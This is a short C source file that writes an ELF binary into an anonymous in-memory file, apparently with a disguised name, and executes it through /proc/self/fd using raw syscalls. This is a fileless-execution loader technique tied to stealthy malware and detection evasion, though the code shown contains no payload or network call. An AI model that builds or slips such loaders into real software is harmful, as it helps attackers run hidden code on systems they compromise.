#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include "common.h"

/* int sys_memfd_create(const char* name, unsigned int flags) {
    return syscall2(__NR_memfd_create, (long)name, flags);
}

int sys_ftruncate(int fd, off_t length) {
    return syscall2(__NR_ftruncate, fd, length);
}

ssize_t sys_write(int fd, const void* buf, size_t count) {
    return syscall3(__NR_write, fd, (long)buf, count);
}

int sys_execve(const char* filename, char* const argv[], char* const envp[]) {
    return syscall3(__NR_execve, (long)filename, (long)argv, (long)envp);
} */

int execute_from_memory(const uint8_t* elf_data, size_t elf_size, char* const argv[], char* const envp[]) {
    // Use masqueraded memfd creation
    int memfd = create_masqueraded_memfd();
    if (memfd < 0) {
        return -1;
    }

    // Set file size using direct syscall
    if (syscall2(__NR_ftruncate, memfd, elf_size) < 0) {
        close(memfd);
        return -1;
    }

    // Write ELF data using direct syscall
    if (syscall3(__NR_write, memfd, (long)elf_data, elf_size) != (long)elf_size) {
        close(memfd);
        return -1;
    }

    char memfd_path[256];
    snprintf(memfd_path, sizeof(memfd_path), "/proc/self/fd/%d", memfd);

    // Execute using direct syscall
    syscall3(__NR_execve, (long)memfd_path, (long)argv, (long)envp);

    close(memfd);
    return -1;
}